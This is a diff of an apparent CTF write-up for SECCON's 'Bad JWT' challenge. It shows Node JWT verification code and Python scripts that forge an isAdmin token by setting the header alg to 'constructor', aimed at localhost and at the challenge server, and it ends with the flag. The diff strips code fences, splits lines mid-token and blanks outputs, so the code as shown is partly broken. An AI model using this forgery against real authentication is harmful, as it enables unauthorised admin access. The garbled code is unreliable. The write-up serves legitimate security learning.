@@ -42,11 +42,6 @@ app.listen(PORT, () => {
  console.log(`[INFO] Use ${admin_session} as session cookie`);
  console.log(`Challenge server listening on port ${PORT}`);
 });
-```
-
-
-
-```
 const crypto = require("crypto");
 
 const base64UrlEncode = (str) => {
@@ -123,17 +118,7 @@ const verify = (token, secret) => {
 };
 
 module.exports = { sign, verify };
-```
-
-
-
-```
 const token = req.cookies.session;
-```
-
-
-
-```
 const verify = (token, secret) => {
  const { header, payload, signature: expected_signature } = parseToken(token);
 
@@ -149,11 +134,6 @@ const verify = (token, secret) => {
 
  return payload;
 };
-```
-
-
-
-```
 import base64
 import requests
 import json
@@ -163,7 +143,8 @@ headerStr = json.dumps(header).encode("utf-8")
 body = {"isAdmin": True}
 bodyStr = json.dumps(body).encode("utf-8")
 
-def base64_encode(str:str):
+def base64_encode(str:
+str):
  return base64.b64encode(str).replace(b"=", b"").replace(b"+", b"-").replace(b"/", b"_")
 
 headerBase64 = str(base64_encode(headerStr))[2:-1]
@@ -171,24 +152,15 @@ bodyBase64 = str(base64_encode(bodyStr))[2:-1]
 
 jwt = f"{headerBase64}.{bodyBase64}.ここにシグネチャを入れる"
 
-res = requests.get("http://localhost:3000/", cookies={"session": jwt})
+res = requests.get("http://localhost:
+3000/", cookies={"session": jwt})
 
 print(res.text)
-```
-
-
-
-```
 const createSignature = (header, payload, secret) => {
  const data = `${stringifyPart(header)}.${stringifyPart(payload)}`;
  const signature = algorithms[header.alg.toLowerCase()](data, secret);
  return signature;
 };
-```
-
-
-
-```
 import base64
 import requests
 import json
@@ -208,29 +180,15 @@ bodyBase64 = str(base64_encode(bodyStr))[2:-1]
 
 jwt = f"{headerBase64}.{bodyBase64}.foo"
 
-res = requests.get("http://localhost:3000/", cookies={"session": jwt})
+res = requests.get("http://localhost:
+3000/", cookies={"session": jwt})
 
 print(res.text)
-```
-
-
-
-```
 {
  expected_signature: 'foo',
  calculated_signature: [String: 'eyJ0eXAiOiJKV1QiLCJhbGciOiJjb25zdHJ1Y3RvciJ9.eyJpc0FkbWluIjp0cnVlfQ']
 }
-```
-
-
-
-```
 jwt = f"{headerBase64}.{bodyBase64}.eyJ0eXAiOiJKV1QiLCJhbGciOiJjb25zdHJ1Y3RvciJ9.eyJpc0FkbWluIjp0cnVlfQ"
-```
-
-
-
-```
 class Foo {
  [Symbol.toPrimitive]() {
  return "ABC";
@@ -239,12 +197,7 @@ class Foo {
 
 const buf1 = Buffer.from(new Foo());
 
-console.log({ buf1 }); // { buf1: <Buffer 41 42 43> }
-```
-
-
-
-```
+console.log({ buf1 }); // { buf1:  }
 class Foo {
  [Symbol.toPrimitive]() {
  return "eyJ0eXAiOiJKV1QiLCJhbGciOiJjb25zdHJ1Y3RvciJ9";
@@ -262,31 +215,16 @@ const buf2 = Buffer.from(new Bar(), "base64");
 
 console.log({ buf1, buf2 });
 //{
-// buf1: <Buffer 7b 22 74 79 70 22 3a 22 4a 57 54 22 2c 22 61 6c 67 22 3a 22 63 6f 6e 73 74 72 75 63 74 6f 72 22 7d>,
-// buf2: <Buffer 7b 22 74 79 70 22 3a 22 4a 57 54 22 2c 22 61 6c 67 22 3a 22 63 6f 6e 73 74 72 75 63 74 6f 72 22 7d>
+// buf1: ,
+// buf2: 
 //}
-```
-
-
-
-```
 jwt = f"{headerBase64}.{bodyBase64}.eyJ0eXAiOiJKV1QiLCJhbGciOiJjb25zdHJ1Y3RvciJ9eyJpc0FkbWluIjp0cnVlfQ"
-```
-
-
-
-```
 {
  expected_signature: 'eyJ0eXAiOiJKV1QiLCJhbGciOiJjb25zdHJ1Y3RvciJ9eyJpc0FkbWluIjp0cnVlfQ',
  calculated_signature: [String: 'eyJ0eXAiOiJKV1QiLCJhbGciOiJjb25zdHJ1Y3RvciJ9.eyJpc0FkbWluIjp0cnVlfQ'],
- calculated_buf: <Buffer 7b 22 74 79 70 22 3a 22 4a 57 54 22 2c 22 61 6c 67 22 3a 22 63 6f 6e 73 74 72 75 63 74 6f 72 22 7d 7b 22 69 73 41 64 6d 69 6e 22 3a 74 72 75 65 7d>,
- expected_buf: <Buffer 7b 22 74 79 70 22 3a 22 4a 57 54 22 2c 22 61 6c 67 22 3a 22 63 6f 6e 73 74 72 75 63 74 6f 72 22 7d 7b 22 69 73 41 64 6d 69 6e 22 3a 74 72 75 65 7d>
+ calculated_buf: ,
+ expected_buf: 
 }
-```
-
-
-
-```
 import base64
 import requests
 import json
@@ -306,13 +244,9 @@ bodyBase64 = str(base64_encode(bodyStr))[2:-1]
 
 jwt = f"{headerBase64}.{bodyBase64}.eyJ0eXAiOiJKV1QiLCJhbGciOiJjb25zdHJ1Y3RvciJ9eyJpc0FkbWluIjp0cnVlfQ"
 
-res = requests.get("http://bad-jwt.seccon.games:3000", cookies={"session": jwt})
+res = requests.get("http://bad-jwt.seccon.games:
+3000", cookies={"session": jwt})
 
 print(res.text)
-```
-
-
-
-```
 SECCON{Map_and_Object.prototype.hasOwnproperty_are_good}
 ```
